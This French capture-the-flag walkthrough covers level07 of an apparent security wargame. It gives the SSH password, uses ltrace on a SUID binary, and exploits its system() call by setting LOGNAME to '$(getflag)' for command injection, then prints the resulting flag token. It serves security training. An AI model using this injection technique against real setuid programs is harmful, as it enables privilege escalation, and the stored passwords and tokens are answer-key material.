# Level07

Connectez-vous en tant que `level07`.

    $ ssh 192.168.1.124 -p 4242 -l level07
    level07@192.168.1.124's password: wiok45aaoguiboiki2tuin6ub
    
 ---

Un exécutable `SUID` se trouve dans le répertoire personnel.

        $ ls -l
        12 au total
        -rwsr-sr-x 1 flag07 level07 8805 5 mars 2016 level07

Semble imprimer le nom de l'exécutable `argv[0]` ?

        $ ./level07
        level07

Utilisez `ltrace` pour intercepter les appels de bibliothèque dynamiques et les appels système exécutés par le programme.

```gdb
$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                 = 2007
geteuid()                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
getenv("LOGNAME")                                         = "level07"
asprintf(0xbffff6f4, 0x8048688, 0xbfffff24, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
<unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                    = 0
+++ exited (status 0) +++
```

Les programmes appellent `getenv()` qui parcourt la liste d'environnements pour trouver la variable d'environnement `LOGNAME`.

Modifiez la variable d'environnement `LOGNAME` avec la substitution de commande en échappant les backticks si vous l'utilisez avec des guillemets doubles.

        $ export LOGNAME='$(getflag)'
        $ ./level07

Check flag.Here is your token: fiumuikeil55xe9cu4dood66h
